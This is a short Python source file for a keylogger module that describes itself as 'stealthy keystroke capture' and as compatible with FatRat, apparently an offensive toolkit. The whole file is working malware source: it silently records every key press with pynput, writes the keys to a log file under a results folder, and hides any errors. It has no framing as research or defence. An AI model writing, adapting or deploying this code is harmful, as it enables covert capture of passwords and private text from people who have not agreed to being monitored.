#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger Module - Stealthy keystroke capture
Compatible with FatRat and other modules
"""
import pynput
from pynput import keyboard
import os

class Keylogger:
    def __init__(self, output_file=None):
        self.output_file = output_file or os.path.join(os.path.dirname(__file__), '..', 'results', 'keydata.log')
        self.listener = None

    def on_press(self, key):
        try:
            with open(self.output_file, 'a') as f:
                f.write(str(key) + '\n')
        except Exception:
            pass

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()

if __name__ == "__main__":
    kl = Keylogger()
    kl.start()
    input("Keylogger running. Press Enter to stop...")
    kl.stop()
